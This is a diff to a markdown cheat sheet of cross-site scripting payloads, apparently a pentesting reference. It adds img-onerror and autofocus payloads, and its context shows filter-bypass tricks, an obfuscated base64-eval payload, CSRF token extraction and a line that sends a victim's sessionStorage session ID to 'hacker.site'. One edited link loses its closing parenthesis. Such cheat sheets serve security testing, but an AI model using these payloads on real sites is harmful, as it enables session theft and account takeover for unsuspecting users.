@@ -4,6 +4,9 @@
 <embed src="http://hacker.site/evil.swf">
 <embed src="javascript:alert(1)">
 <iframe src='jAvAsCripT:alert`1`'></iframe>
+'"><img/src/onerror=alert(1)> 
+<table><td onfocus=alert(1) autofocus tabindex=1>
+<table><td><img/src/onerror=alert(1)>
 ```
 
 ## Filter Bypass
@@ -12,12 +15,10 @@
 	```js
 	var b=new Blob(['alert(document.domain)']); var s = document.createElement('script'); s.src = URL.createObjectURL(b); document.head.appendChild(s);
 	```
-
 ### Base64 into Eval
 ```html
 <img src=x o<scriptnerror=javajavascript:script:eval(atob('%s'))>
 ```
-
 ## Extract Session Data
 ```js
 new Image().src ="http://hacker.site/SID?"+escape(sessionStorage.getItem('sessionID'));
@@ -51,7 +52,6 @@ Using DOM
 ```js
 var token = document.getElementsByName('csrf_token')[0].value
 ```
-
 ### Extract CSRF Token from XSS in different page
 Using regex
 ```js
@@ -100,11 +100,7 @@ function fetchUrl(url, wait){
 }
 </script> 
 ```
-
-
 ## Write-ups
-- [Intigriti — XSS Challenge 0621. XSS via WebAssembly | by FHantke | InfoSec Write-ups (infosecwriteups.com)](https://infosecwriteups.com/intigriti-xss-challenge-0621-cf76c28840c1)
-
-
+- [Intigriti — XSS Challenge 0621. XSS via WebAssembly | by FHantke | InfoSec Write-ups (infosecwriteups.com)](https://infosecwriteups.com/intigriti-xss-challenge-0621-cf76c28840c1
 ## Techniques
 - [Blind CSS Exfiltration: exfiltrate unknown web pages | PortSwigger Research](https://portswigger.net/research/blind-css-exfiltration)
